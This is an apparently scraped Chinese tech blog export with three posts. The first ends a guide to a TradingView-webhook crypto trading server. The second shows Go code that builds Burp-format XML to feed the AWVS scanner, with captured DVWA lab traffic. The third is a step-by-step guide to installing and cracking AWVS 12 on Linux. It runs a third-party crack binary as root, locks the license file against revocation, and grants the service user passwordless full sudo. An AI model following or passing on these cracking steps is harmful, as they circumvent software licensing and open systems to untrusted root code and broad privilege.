简单来说ccxt就是把所有的交易所的各自不同的api接口都封装好了，你只要在代码里配置好自己交易所的api key，就可以用统一的函数去实现交易。这样的好处是辛辛苦苦写的策略代码，想移植到火币就改一下火币的api key，想移植到币安就改一下币安的key，其他代码根本不用动。 注：ccxt当前还没有封装火币的季度合约接口，想做合约量化交易的可能要等官方实现或者自己实现。做现货是没问题的。 上面这段程序如何运行：1python huobi.py 这样就运行起来了，如果你要后台运行就1nohup python huobi.py &amp; 假设你的购买的服务器ip是123.123.123.123，当你运行之后，post请求http://123.123.123.123/btc?buy就会走到12345678def post(self): buy = self.get_arguments(&quot;buy&quot;) sell = self.get_arguments(&quot;sell&quot;) if buy: buy_btc() if sell: sell_btc() self.write(&quot;Hello,Tornado.&quot;) 函数里，程序判断post请求中有buy参数，那就执行buy_btc()，买入btc。 123456def buy_btc(): symbol = &apos;BTC/USDT&apos; amount = 0.9 # BTC price = 9000 # USDT cost = amount*price ex.createMarketBuyOrder(symbol, cost) buy_btc函数里面我写的是以市价（createMarketBuyOrder）买入btc，可以去查一下这个函数createMarketBuyOrder。为什么是0.9*9000？因为我以市价买入时，只能买入这么多usdt的btc。买入逻辑需要你自己去设计，我这里只是当时的例子…. 卖出跟买入的逻辑同理，可以自己看代码理解。web程序的运行逻辑就是如上所述。 怎么与webhook对接呢？看到上面其实已经很明显了，只要webhook可以请求我们服务器web程序的post接口带着buy或者sell参数就可以了。所以在webhook处配置http://123.123.123.123/btc?buy 点创建，就是一个配置了webhook的警报。这样在策略触发警报时就会执行警报配置里面的内容，比如触发Webhook。注意Webhook触发请求时是POST请求，不是GET请求，我代码里面的get请求方法忽略就好。。POST请求里面还能携带下方表单里面设置的数据，这些我在demo里面就详细阐述了。 再创建一个卖出的警告，步骤跟上面创建警报的步骤是一样的，只是选的是相反的如下图，不再文字描述 这样tv的webhook通知python对接交易所就做完了。 对了，Webhook功能是收费的，tv收费也有点小贵… 币圈友情提示“本是同根生，相煎何太急”，同是韭菜，我已经亏了小县城的半套房子的钱了。这个市场没有踏入的最好也别进来了，稳定的买买基金、保本理财还是挺香的，币圈到处都是庄家割你的镰刀。 上述代码只是demo，提供tv对接实盘的参考。tv也可以通过webhook对接fmz.com发明者量化交易平台。tv听说也有chrome插件之类的对接啥啥的。 我现在已经不是这种略显笨拙的方法去回测，去对接实盘。 因为不懂金融也不懂交易，我跟朋友通过tv上或者网络上别人开源的策略进行优化，然后把tv上用pine script语言写的脚本改写成python，在fmz上回测更精准，在fmz上对接实盘更容易一些，如此拾人牙慧（好可怜）～ 钱没赚到，表情倒是收藏了一大堆！我还有几个难兄难弟等着我的策略上车致富呢～不说了，先跑个半年看看…","tags":[{"name":"btc","slug":"btc","permalink":"http://pirogue.org/tags/btc/"},{"name":"量化交易","slug":"量化交易","permalink":"http://pirogue.org/tags/量化交易/"}]},{"title":"被动扫描器研发（1）：golang生成cdata xml格式数据","date":"2020-02-22T11:34:33.000Z","path":"2020/02/22/golangxml/","text":"背景我已经把awvs变成了被动扫描器引擎，其中一些关键环节，我会做一些总结以笔记形式发出来。 awvs可以通过导入burpsuite的导出xml文件作为被动扫描器流量的流量输入，它还可以接收如下所述的数据格式 Accepted formats include text file with a list of URLs (.txt), Fiddler session archives (.saz), Swagger files (.json, .yaml or .yml), Web Services Definition Files (.wsdl), BURP saved files (.xml) and state files, Selenium (.html, .side), Web Application Description Language (.wadl), ASP.NET Web Forms Project Files (.csproj, .vbproj), Paros log files (.session.data), Postman Collections v2 (.json) or HTTP archive files (*.har) 原burpsuite xml导出数据格式123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE items [&lt;!ELEMENT items (item*)&gt;&lt;!ATTLIST items burpVersion CDATA \"\"&gt;&lt;!ATTLIST items exportTime CDATA \"\"&gt;&lt;!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)&gt;&lt;!ELEMENT time (#PCDATA)&gt;&lt;!ELEMENT url (#PCDATA)&gt;&lt;!ELEMENT host (#PCDATA)&gt;&lt;!ATTLIST host ip CDATA \"\"&gt;&lt;!ELEMENT port (#PCDATA)&gt;&lt;!ELEMENT protocol (#PCDATA)&gt;&lt;!ELEMENT method (#PCDATA)&gt;&lt;!ELEMENT path (#PCDATA)&gt;&lt;!ELEMENT extension (#PCDATA)&gt;&lt;!ELEMENT request (#PCDATA)&gt;&lt;!ATTLIST request base64 (true|false) \"false\"&gt;&lt;!ELEMENT status (#PCDATA)&gt;&lt;!ELEMENT responselength (#PCDATA)&gt;&lt;!ELEMENT mimetype (#PCDATA)&gt;&lt;!ELEMENT response (#PCDATA)&gt;&lt;!ATTLIST response base64 (true|false) \"false\"&gt;&lt;!ELEMENT comment (#PCDATA)&gt;]&gt;&lt;items burpVersion=\"2.1.06\" exportTime=\"Tue Feb 04 17:55:42 CST 2020\"&gt; &lt;item&gt; &lt;time&gt;Tue Feb 04 17:55:28 CST 2020&lt;/time&gt; &lt;url&gt;&lt;![CDATA[http://192.168.0.108/vulnerabilities/sqli_blind/?id=qyf&amp;Submit=Submit]]&gt;&lt;/url&gt; &lt;host ip=\"192.168.0.108\"&gt;192.168.0.108&lt;/host&gt; &lt;port&gt;80&lt;/port&gt; &lt;protocol&gt;http&lt;/protocol&gt; &lt;method&gt;&lt;![CDATA[GET]]&gt;&lt;/method&gt; &lt;path&gt;&lt;![CDATA[/vulnerabilities/sqli_blind/?id=qyf&amp;Submit=Submit]]&gt;&lt;/path&gt; &lt;extension&gt;null&lt;/extension&gt; &lt;request base64=\"true\"&gt;&lt;![CDATA[R0VUIC92dWxuZXJhYmlsaXRpZXMvc3FsaV9ibGluZC8/aWQ9cXlmJlN1Ym1pdD1TdWJtaXQgSFRUUC8xLjENCkhvc3Q6IDE5Mi4xNjguMC4xMDgNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzMpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83OS4wLjM5NDUuMTMwIFNhZmFyaS81MzcuMzYNCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQtTGFuZ3VhZ2U6IHpoLUNOLHpoO3E9MC45DQpDb29raWU6IFBIUFNFU1NJRD1pdmJ1amc4ZWNyYTIxMm9sNGplZGxhbWd1Njsgc2VjdXJpdHk9bG93DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]&gt;&lt;/request&gt; &lt;status&gt;404&lt;/status&gt; &lt;responselength&gt;4842&lt;/responselength&gt; &lt;mimetype&gt;HTML&lt;/mimetype&gt; &lt;response base64=\"true\"&gt;&lt;![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KRGF0ZTogVHVlLCAwNCBGZWIgMjAyMCAwOTo1NToyOCBHTVQNClNlcnZlcjogQXBhY2hlLzIuNC4yNSAoRGViaWFuKQ0KRXhwaXJlczogVHVlLCAyMyBKdW4gMjAwOSAxMjowMDowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUNClByYWdtYTogbm8tY2FjaGUNCkNvbnRlbnQtTGVuZ3RoOiA0NTY3DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOA0KDQoNCjwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFN0cmljdC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS1zdHJpY3QuZHRkIj4NCg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPg0KDQoJPGhlYWQ+DQoJCTxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04IiAvPg0KDQoJCTx0aXRsZT5WdWxuZXJhYmlsaXR5OiBTUUwgSW5qZWN0aW9uIChCbGluZCkgOjogRGFtbiBWdWxuZXJhYmxlIFdlYiBBcHBsaWNhdGlvbiAoRFZXQSkgdjEuMTAgKkRldmVsb3BtZW50KjwvdGl0bGU+DQoNCgkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iLi4vLi4vZHZ3YS9jc3MvbWFpbi5jc3MiIC8+DQoNCgkJPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJcaW1hZ2UvaWNvIiBocmVmPSIuLi8uLi9mYXZpY29uLmljbyIgLz4NCg0KCQk8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSIuLi8uLi9kdndhL2pzL2R2d2FQYWdlLmpzIj48L3NjcmlwdD4NCg0KCTwvaGVhZD4NCg0KCTxib2R5IGNsYXNzPSJob21lIj4NCgkJPGRpdiBpZD0iY29udGFpbmVyIj4NCg0KCQkJPGRpdiBpZD0iaGVhZGVyIj4NCg0KCQkJCTxpbWcgc3JjPSIuLi8uLi9kdndhL2ltYWdlcy9sb2dvLnBuZyIgYWx0PSJEYW1uIFZ1bG5lcmFibGUgV2ViIEFwcGxpY2F0aW9uIiAvPg0KDQoJCQk8L2Rpdj4NCg0KCQkJPGRpdiBpZD0ibWFpbl9tZW51Ij4NCg0KCQkJCTxkaXYgaWQ9Im1haW5fbWVudV9wYWRkZWQiPg0KCQkJCTx1bCBjbGFzcz0ibWVudUJsb2NrcyI+PGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uLy4iPkhvbWU8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL2luc3RydWN0aW9ucy5waHAiPkluc3RydWN0aW9uczwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vc2V0dXAucGhwIj5TZXR1cCAvIFJlc2V0IERCPC9hPjwvbGk+CjwvdWw+PHVsIGNsYXNzPSJtZW51QmxvY2tzIj48bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2JydXRlLyI+QnJ1dGUgRm9yY2U8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9leGVjLyI+Q29tbWFuZCBJbmplY3Rpb248L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9jc3JmLyI+Q1NSRjwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2ZpLy4/cGFnZT1pbmNsdWRlLnBocCI+RmlsZSBJbmNsdXNpb248L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy91cGxvYWQvIj5GaWxlIFVwbG9hZDwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2NhcHRjaGEvIj5JbnNlY3VyZSBDQVBUQ0hBPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvc3FsaS8iPlNRTCBJbmplY3Rpb248L2E+PC9saT4KPGxpIGNsYXNzPSJzZWxlY3RlZCI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3NxbGlfYmxpbmQvIj5TUUwgSW5qZWN0aW9uIChCbGluZCk8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy93ZWFrX2lkLyI+V2VhayBTZXNzaW9uIElEczwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3hzc19kLyI+WFNTIChET00pPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMveHNzX3IvIj5YU1MgKFJlZmxlY3RlZCk8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy94c3Nfcy8iPlhTUyAoU3RvcmVkKTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2NzcC8iPkNTUCBCeXBhc3M8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9qYXZhc2NyaXB0LyI+SmF2YVNjcmlwdDwvYT48L2xpPgo8L3VsPjx1bCBjbGFzcz0ibWVudUJsb2NrcyI+PGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3NlY3VyaXR5LnBocCI+RFZXQSBTZWN1cml0eTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vcGhwaW5mby5waHAiPlBIUCBJbmZvPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9hYm91dC5waHAiPkFib3V0PC9hPjwvbGk+CjwvdWw+PHVsIGNsYXNzPSJtZW51QmxvY2tzIj48bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vbG9nb3V0LnBocCI+TG9nb3V0PC9hPjwvbGk+CjwvdWw+DQoJCQkJPC9kaXY+DQoNCgkJCTwvZGl2Pg0KDQoJCQk8ZGl2IGlkPSJtYWluX2JvZHkiPg0KDQoJCQkJDQo8ZGl2IGNsYXNzPSJib2R5X3BhZGRlZCI+DQoJPGgxPlZ1bG5lcmFiaWxpdHk6IFNRTCBJbmplY3Rpb24gKEJsaW5kKTwvaDE+DQoNCgkNCg0KCTxkaXYgY2xhc3M9InZ1bG5lcmFibGVfY29kZV9hcmVhIj4NCgkJPGZvcm0gYWN0aW9uPSIjIiBtZXRob2Q9IkdFVCI+DQoJCQk8cD4NCgkJCQlVc2VyIElEOgoJCQkJPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjE1IiBuYW1lPSJpZCI+CgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJTdWJtaXQiIHZhbHVlPSJTdWJtaXQiPg0KCQkJPC9wPgoNCgkJPC9mb3JtPg0KCQk8cHJlPlVzZXIgSUQgaXMgTUlTU0lORyBmcm9tIHRoZSBkYXRhYmFzZS48L3ByZT4NCgk8L2Rpdj4NCg0KCTxoMj5Nb3JlIEluZm9ybWF0aW9uPC9oMj4NCgk8dWw+DQoJCTxsaT48YSBocmVmPSJodHRwOi8vd3d3LnNlY3VyaXRlYW0uY29tL3NlY3VyaXR5cmV2aWV3cy81RFAwTjFQNzZFLmh0bWwiIHRhcmdldD0iX2JsYW5rIj5odHRwOi8vd3d3LnNlY3VyaXRlYW0uY29tL3NlY3VyaXR5cmV2aWV3cy81RFAwTjFQNzZFLmh0bWw8L2E+PC9saT4NCgkJPGxpPjxhIGhyZWY9Imh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1NRTF9pbmplY3Rpb24iIHRhcmdldD0iX2JsYW5rIj5odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9TUUxfaW5qZWN0aW9uPC9hPjwvbGk+DQoJCTxsaT48YSBocmVmPSJodHRwOi8vZmVycnVoLm1hdml0dW5hLmNvbS9zcWwtaW5qZWN0aW9uLWNoZWF0c2hlZXQtb2t1LyIgdGFyZ2V0PSJfYmxhbmsiPmh0dHA6Ly9mZXJydWgubWF2aXR1bmEuY29tL3NxbC1pbmplY3Rpb24tY2hlYXRzaGVldC1va3UvPC9hPjwvbGk+DQoJCTxsaT48YSBocmVmPSJodHRwOi8vcGVudGVzdG1vbmtleS5uZXQvY2hlYXQtc2hlZXQvc3FsLWluamVjdGlvbi9teXNxbC1zcWwtaW5qZWN0aW9uLWNoZWF0LXNoZWV0IiB0YXJnZXQ9Il9ibGFuayI+aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0L2NoZWF0LXNoZWV0L3NxbC1pbmplY3Rpb24vbXlzcWwtc3FsLWluamVjdGlvbi1jaGVhdC1zaGVldDwvYT48L2xpPg0KCQk8bGk+PGEgaHJlZj0iaHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9CbGluZF9TUUxfSW5qZWN0aW9uIiB0YXJnZXQ9Il9ibGFuayI+aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9CbGluZF9TUUxfSW5qZWN0aW9uPC9hPjwvbGk+DQoJCTxsaT48YSBocmVmPSJodHRwOi8vYm9iYnktdGFibGVzLmNvbS8iIHRhcmdldD0iX2JsYW5rIj5odHRwOi8vYm9iYnktdGFibGVzLmNvbS88L2E+PC9saT4NCgk8L3VsPg0KPC9kaXY+Cg0KCQkJCTxiciAvPjxiciAvPg0KCQkJCQ0KDQoJCQk8L2Rpdj4NCg0KCQkJPGRpdiBjbGFzcz0iY2xlYXIiPg0KCQkJPC9kaXY+DQoNCgkJCTxkaXYgaWQ9InN5c3RlbV9pbmZvIj4NCgkJCQk8aW5wdXQgdHlwZT0iYnV0dG9uIiB2YWx1ZT0iVmlldyBIZWxwIiBjbGFzcz0icG9wdXBfYnV0dG9uIiBpZD0naGVscF9idXR0b24nIGRhdGEtaGVscC11cmw9Jy4uLy4uL3Z1bG5lcmFiaWxpdGllcy92aWV3X2hlbHAucGhwP2lkPXNxbGlfYmxpbmQmc2VjdXJpdHk9bG93JyApIj4gPGlucHV0IHR5cGU9ImJ1dHRvbiIgdmFsdWU9IlZpZXcgU291cmNlIiBjbGFzcz0icG9wdXBfYnV0dG9uIiBpZD0nc291cmNlX2J1dHRvbicgZGF0YS1zb3VyY2UtdXJsPScuLi8uLi92dWxuZXJhYmlsaXRpZXMvdmlld19zb3VyY2UucGhwP2lkPXNxbGlfYmxpbmQmc2VjdXJpdHk9bG93JyApIj4gPGRpdiBhbGlnbj0ibGVmdCI+PGVtPlVzZXJuYW1lOjwvZW0+IGFkbWluPGJyIC8+PGVtPlNlY3VyaXR5IExldmVsOjwvZW0+IGxvdzxiciAvPjxlbT5QSFBJRFM6PC9lbT4gZGlzYWJsZWQ8L2Rpdj4NCgkJCTwvZGl2Pg0KDQoJCQk8ZGl2IGlkPSJmb290ZXIiPg0KDQoJCQkJPHA+RGFtbiBWdWxuZXJhYmxlIFdlYiBBcHBsaWNhdGlvbiAoRFZXQSkgdjEuMTAgKkRldmVsb3BtZW50KjwvcD4NCgkJCQk8c2NyaXB0IHNyYz0nL2R2d2EvanMvYWRkX2V2ZW50X2xpc3RlbmVycy5qcyc+PC9zY3JpcHQ+DQoNCgkJCTwvZGl2Pg0KDQoJCTwvZGl2Pg0KDQoJPC9ib2R5Pg0KDQo8L2h0bWw+]]&gt;&lt;/response&gt; &lt;comment&gt;&lt;/comment&gt; &lt;/item&gt;&lt;/items&gt; 精简后xml数据格式： 为什么需要精简成如下数据格式？因为经过调研调试，发现url节点是必须的，而request节点awvs会在post请求中使用，method节点多一个也不多，就顺便带入。其他节点删除后，并没有明显的影响漏洞扫描结果数据。在awvs12中url节点还不是必须的，而awvs13不设置url节点会无法扫描”terminate called after throwing an instance of ‘ax::utility::WvsException’\\n what(): HttpJob: unable to set url:”。1234567&lt;items burpVersion=\"2.1.06\"&gt; &lt;item&gt; &lt;url&gt;&lt;![CDATA[http://awvshello.m.apple.com/vulnerabilities/sqli_blind/?id=qyf&amp;Submit=Submit]]&gt;&lt;/url&gt; &lt;method&gt;&lt;![CDATA[GET]]&gt;&lt;/method&gt; &lt;request base64=\"true\"&gt;&lt;![CDATA[R0VUIC92dWxuZXJhYmlsaXRpZXMvc3FsaV9ibGluZC8gSFRUUC8xLjENClJlZmVyZXI6IGh0dHA6Ly9hd3ZzcXlmLnRlc3Quc2Fua3VhaS5jb20vdnVsbmVyYWJpbGl0aWVzL3NxbGlfYmxpbmQvDQpIb3N0OiBhd3ZzcXlmLnRlc3Quc2Fua3VhaS5jb20NClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzMpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83OS4wLjM5NDUuMTMwIFNhZmFyaS81MzcuMzYNCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOQ0KQWNjZXB0LUxhbmd1YWdlOiB6aC1DTix6aDtxPTAuOQ0KQ29va2llOiBfbHhzZGtfY3VpZD0xNmY1NGVkMWYwNGM4LTA5OTE4N2Y3NmFlNzk2LTFkMzM2YjVhLTE2ODAwMC0xNmY1NGVkMWYwNWM4OyBfbHhzZGs9MTZmNTRlZDFmMDRjOC0wOTkxODdmNzZhZTc5Ni0xZDMzNmI1YS0xNjgwMDAtMTZmNTRlZDFmMDVjODsgdT0xMjkwNTEzNDgyOyBfZ2E9R0ExLjIuNDg0Mzc2ODA4LjE1Nzk0MzAzMTQ7IF9seHNka19zPTE3MDFlYzg4ODJhLTIyNC1mN2UtZmIxJTdDcXV5aWZlaSU3QzI3OyBQSFBTRVNTSUQ9cjJkYmtudTRzbnFpYWRiYmllM2dnOWZxYTA7IHNlY3VyaXR5PWxvdw0KDQo=]]&gt;&lt;/request&gt; &lt;/item&gt;&lt;/items&gt; cdata xml with golang of export burpsuite1234567891011121314151617181920212223242526272829303132333435363738394041424344package mainimport ( \"encoding/xml\" \"fmt\")type items struct &#123; XMLName xml.Name `xml:\"items\"` Version string `xml:\"burpVersion,attr\"` Itemlist []item `xml:\"item\"`&#125;type item struct &#123; URL CdataStringUrl `xml:\"url\"` METHOD CdataStringMethod `xml:\"method\"` Req CdataString `xml:\"request\"`&#125;type CdataString struct &#123; Value string `xml:\",cdata\"` Base64 string `xml:\"base64,attr\"`&#125;type CdataStringUrl struct &#123; Value string `xml:\",cdata\"`&#125;type CdataStringMethod struct &#123; Value string `xml:\",cdata\"`&#125;func main() &#123; v := &amp;items&#123;Version: \"2.1.06\"&#125; for i:=0;i&lt;10;i++&#123; v.Itemlist = append(v.Itemlist, item&#123;URL:CdataStringUrl&#123;Value:\"http://123.com\"&#125;, METHOD:CdataStringMethod&#123;Value:\"GET\"&#125;, Req: CdataString&#123;Value: \"bbbccc\", Base64:\"true\"&#125;&#125;) &#125; output, err := xml.MarshalIndent(v, \"\", \" \") if err != nil &#123; fmt.Printf(\"error: %v\\n\", err) &#125; fmt.Println(string(output))&#125; 输出结果：对base64数据在demo中没有转码，这里只做整体数据格式参考12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;items burpVersion=\"2.1.06\"&gt; &lt;item&gt; &lt;url&gt;&lt;![CDATA[http://123.com]]&gt;&lt;/url&gt; &lt;method&gt;&lt;![CDATA[GET]]&gt;&lt;/method&gt; &lt;request base64=\"true\"&gt;&lt;![CDATA[bbbccc]]&gt;&lt;/request&gt; &lt;/item&gt; &lt;item&gt; &lt;url&gt;&lt;![CDATA[http://123.com]]&gt;&lt;/url&gt; &lt;method&gt;&lt;![CDATA[GET]]&gt;&lt;/method&gt; &lt;request base64=\"true\"&gt;&lt;![CDATA[bbbccc]]&gt;&lt;/request&gt; &lt;/item&gt; &lt;item&gt; &lt;url&gt;&lt;![CDATA[http://123.com]]&gt;&lt;/url&gt; &lt;method&gt;&lt;![CDATA[GET]]&gt;&lt;/method&gt; &lt;request base64=\"true\"&gt;&lt;![CDATA[bbbccc]]&gt;&lt;/request&gt; &lt;/item&gt; &lt;item&gt; &lt;url&gt;&lt;![CDATA[http://123.com]]&gt;&lt;/url&gt; &lt;method&gt;&lt;![CDATA[GET]]&gt;&lt;/method&gt; &lt;request base64=\"true\"&gt;&lt;![CDATA[bbbccc]]&gt;&lt;/request&gt; &lt;/item&gt; &lt;item&gt; &lt;url&gt;&lt;![CDATA[http://123.com]]&gt;&lt;/url&gt; &lt;method&gt;&lt;![CDATA[GET]]&gt;&lt;/method&gt; &lt;request base64=\"true\"&gt;&lt;![CDATA[bbbccc]]&gt;&lt;/request&gt; &lt;/item&gt; &lt;item&gt; &lt;url&gt;&lt;![CDATA[http://123.com]]&gt;&lt;/url&gt; &lt;method&gt;&lt;![CDATA[GET]]&gt;&lt;/method&gt; &lt;request base64=\"true\"&gt;&lt;![CDATA[bbbccc]]&gt;&lt;/request&gt; &lt;/item&gt; &lt;item&gt; &lt;url&gt;&lt;![CDATA[http://123.com]]&gt;&lt;/url&gt; &lt;method&gt;&lt;![CDATA[GET]]&gt;&lt;/method&gt; &lt;request base64=\"true\"&gt;&lt;![CDATA[bbbccc]]&gt;&lt;/request&gt; &lt;/item&gt; &lt;item&gt; &lt;url&gt;&lt;![CDATA[http://123.com]]&gt;&lt;/url&gt; &lt;method&gt;&lt;![CDATA[GET]]&gt;&lt;/method&gt; &lt;request base64=\"true\"&gt;&lt;![CDATA[bbbccc]]&gt;&lt;/request&gt; &lt;/item&gt; &lt;item&gt; &lt;url&gt;&lt;![CDATA[http://123.com]]&gt;&lt;/url&gt; &lt;method&gt;&lt;![CDATA[GET]]&gt;&lt;/method&gt; &lt;request base64=\"true\"&gt;&lt;![CDATA[bbbccc]]&gt;&lt;/request&gt; &lt;/item&gt; &lt;item&gt; &lt;url&gt;&lt;![CDATA[http://123.com]]&gt;&lt;/url&gt; &lt;method&gt;&lt;![CDATA[GET]]&gt;&lt;/method&gt; &lt;request base64=\"true\"&gt;&lt;![CDATA[bbbccc]]&gt;&lt;/request&gt; &lt;/item&gt;&lt;/items&gt;","tags":[{"name":"awvs","slug":"awvs","permalink":"http://pirogue.org/tags/awvs/"},{"name":"xml","slug":"xml","permalink":"http://pirogue.org/tags/xml/"},{"name":"cdata","slug":"cdata","permalink":"http://pirogue.org/tags/cdata/"},{"name":"burpsuite","slug":"burpsuite","permalink":"http://pirogue.org/tags/burpsuite/"},{"name":"golang","slug":"golang","permalink":"http://pirogue.org/tags/golang/"}]},{"title":"awvs（12.0.190515149）linux 安装和破解","date":"2019-06-17T15:26:33.000Z","path":"2019/06/17/awvs/","text":"升级Ubuntu操作系统1do-release-upgrade 升级完成后版本为Ubuntu 18.04.2 LTS \\n \\l 安装软件依赖1sudo apt-get install libxdamage1 libgtk-3-0 libasound2 libnss3 libxss1 libx11-xcb-dev 若安装出错，可参考我的下列步骤： 可能安装的并不顺利，尤其libx11-xcb-dev，这时候你需要根据错误提示安装它的合适版本的依赖包。123sudo apt-get install libxdmcp6=1:1.1.2-1.1sudo apt-get install libxcb1=1.11.1-1ubuntu1sudo apt-get install libxcb1-dev 从官网下载最新的awvs linux版本下载地址：https://www.acunetix.com/web-vulnerability-scanner/demo/ 填写好申请人的邮箱等信息，提交就可以跳转到真实的软件包下载地址。 截止2019-06-17 15:57:39我下载的最新版本为Version: 12.0.190515149(15 May 2019) 不想从官网下载或者官网已经取消这种下载流程的，可以从本文底部的下载链接进行下载。 安装awvs123chmod 777 acunetix_trial.shsudo ./acunetix_trial.sh.....当你输入了上面的命令之后，会进行安装，其中包括阅读它的使用协议，回车到输入yes，然后输入一系列内容。直到安装完成。 awvs修改端口默认的awvs的端口是13443，因为其他原因我需要把端口修改为443.调试过程就略了。。。直接给出解决方案吧。 修改web端口 1vi /home/acunetix/.acunetix_trial/wvs.ini 将server.port=13443改为server.port=443 添加/etc/sudoers，免密码可sudo用户。 编辑/etc/sudoers1vi /etc/sudoers 加一行内容，并保存1acunetix ALL=(ALL) NOPASSWD: ALL 在/home/acunetix/.acunetix_trial/start.sh第19行，行首添加sudo。 重新启动awvs12345sudo systemctl restart acunetix_trial.service启动和停止命令sudo systemctl start acunetix_trial.servicesudo systemctl stop acunetix_trial.service 破解awvs注意要把破解补丁复制/home/acunetix/.acunetix_trial/v_190515149/scanner/目录下，其中v_190515149是你的awvs安装完成后根据版本生成的目录。 12345apt-get install unzipunzip patch_awvs.zipcd /home/acunetix/.acunetix_trial/v_190515149/scanner/sudo cp ~/patch_awvs .sudo ./patch_awvs 破解成功后会显示： 12345678910111213&lt; xs3c.co &gt; ------------ \\ ,__, \\ (oo)____ (__) )\\ ||--|| *Crack by bigchan.Tested on v_190325161.Usage: Copy me to the scanner folder and run as root.Check environment.Generating license.Patch executable.Jobs done, there you go. 保护license不失效执行完成patch之后，尽快执行如下的命令，不然license会被修改的。1chattr +i /home/acunetix/.acunetix_trial/data/license/license_info.json awvs破解后14天失效问题解决—————–2019-08-16 19:35:27更新—————————— 